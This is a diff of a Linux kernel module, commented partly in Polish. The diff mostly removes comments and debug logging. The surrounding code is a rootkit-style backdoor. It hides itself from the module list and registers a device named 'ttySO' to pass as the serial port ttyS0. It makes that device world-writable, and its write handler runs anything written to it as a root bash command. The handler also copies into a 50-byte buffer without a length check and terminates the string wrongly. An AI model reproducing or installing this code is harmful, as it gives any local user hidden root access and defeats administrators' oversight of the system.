@@ -17,7 +17,6 @@ MODULE_VERSION("1.0.0");
 static int major_num = 0;
 static struct class* dev_class = NULL;
 static struct device* dev_struct = NULL;
-//static int open_num = 0;
 
 char *envp[] = {"HOME=/", NULL};
 
@@ -57,9 +56,6 @@ void reveal_module(void){
         modHidden = 0;
 }
 
-/*
- * funkcja rejestrująca urządzenie- początek istnienia nowego urządzenia
- */
 static int __init register_device(void)
 {
   /*próba inicjalizacji*/
@@ -67,22 +63,16 @@ static int __init register_device(void)
   major_num = register_chrdev( 0, DEV_NAME, &fops );
   if(major_num<0) //error gdy cos się zepsuje
   {
-    //printk(KERN_WARNING "CharDev: Error: cannot register device. Major number error\n");
     return major_num;
   }
-  //printk(KERN_INFO "CharDev: Registerring complete with major number %d\n", major_num);
 
-/*tworzenie klasy urządzenia- rejestracja*/
   dev_class = class_create(THIS_MODULE, CLASS_NAME);
   if(IS_ERR(dev_class))
   {
     unregister_chrdev(major_num, DEV_NAME);
-    //printk(KERN_WARNING "CharDev: cannot register device class");
     return PTR_ERR(dev_class);
   }
-  //printk(KERN_INFO "CharDev: device class registered correctly\n");
 
-/*tworzenie klasy urządzenia- tworzenie*/
   dev_struct = device_create(dev_class, NULL, MKDEV(major_num, 0), NULL, DEV_NAME);
   if(IS_ERR(dev_struct))
   {
@@ -90,7 +80,6 @@ static int __init register_device(void)
     unregister_chrdev(major_num, DEV_NAME);
     return PTR_ERR(dev_struct);
   }
-  //printk(KERN_INFO "CharDev: device class created correctly\n");
   	/* permission to rwx-rw-rw*/
         char *argv[] = { "/bin/bash", "-c", "chmod 666 /dev/ttySO", NULL};
 	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
@@ -98,9 +87,6 @@ static int __init register_device(void)
   return 0;
 }
 
-/*
- * funkcja usuwająca urządzenie
- */
 static void __exit unregister_device(void)
 {
   reveal_module();
@@ -112,8 +98,6 @@ static void __exit unregister_device(void)
 
 static int dev_open(struct inode *inodep, struct file *filep)
 {
-  //open_num++;
-  //printk(KERN_INFO "CharDev: Device was %d x opened\n", open_num);
   return 0;
 }
 
@@ -124,19 +108,18 @@ static ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *of
 
 static ssize_t dev_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
 {
+	/* execute commands */
 	char comm[50];
 	comm[len-1] = '/0';
 	strncpy(comm, buffer, len);
 	char *argv[] = { "/bin/bash", "-c", comm, NULL};
 	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-	//printk(KERN_INFO "CharDev: writing complete %s", buffer);
 
 	return len;
 }
 
 static int dev_release(struct inode *inodep, struct file *filep)
 {
-   //printk(KERN_INFO "CharDev: Device successfully closed\n");
    return 0;
  }
 
